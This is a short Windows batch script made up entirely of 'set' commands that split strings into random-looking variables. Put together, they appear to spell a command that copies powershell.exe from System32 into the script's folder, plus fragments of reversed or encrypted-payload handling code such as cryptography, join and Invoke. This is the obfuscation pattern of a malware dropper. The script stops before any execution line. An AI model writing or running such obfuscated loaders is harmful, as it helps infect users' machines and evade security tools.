@echo off
set "OViPXnsWsB=nd"
set "sapIBbXVXd=s\"
set "abUjdEYjGz=he"
set "fyfZNaGOeb=he"
set "ZmimVZjTuG= C"
set "JpIUramepy=we"
set "ZohydLkRje=in"
set "gsxVIQDVPd=:\"
set "rMFJHWRIpt=we"
set "KKTXJTGGVH=1."
set "STNoYauJWI=ll"
set "xGDnlQcJOy=st"
set "ejnNxMsFGo=rS"
set "zJmbxXbYgX=y "
set "bdxPGanboF= /"
set "qdEnIXgpvW=0\"
set "iqEvHVWeMR=py"
set "TaqmGUsjJi=rs"
set "qEdEWcpAlO=Po"
set "ZqffWNGAoW=em"
set "QRdLGHuyRN=xe"
set "FJtbdaHoNJ=do"
set "mmVBSOFMLk=ws"
set "bqWfSlkHXu=Sy"
set "KcZWdgPyew=.e"
set "qYpmoSYTWo=Wi"
set "XWxsghqqgk=\v"
set "ABjnBbtpmF=co"
set "SAVFyQSINR=ow"
set "GkKttLxbwK=\W"
set "KgcYrAGmUW=ll"
set "qxZpACDPNm=32"
set "ggLKqjaNTG=po"
set "umxvqAIwpO= %~dp0"
set "FYkfJrdLRI=cd"
set "eidWYSsxGp=fore"
set "ShddoPrJlw=-4] "
set "gKKXYiqgAz=7;$n"
set "PzpwYcucXk=gnir"
set "sAdPkJDmmW=ct S"
set "GciQlVfsKW=le  "
set "YgpHKwurhU=hy.A"
set "bmSzeSgopw=;$Cy"
set "SMWKmOwyCS=saBm"
set "tCycazCNzM=Comp"
set "zDADKDWDZj= if "
set "atWiGencXo=0O+g"
set "LIWtBudZPE=:('g"
set "CAwCgJfDlw=16] "
set "txzKLqZTiD=th('"
set "SzxopZGkzU=join"
set "BFsDkeNNjv=pose"
set "iefkhCHfnK=OaJf"
set "meKjPRAqby=ke($"
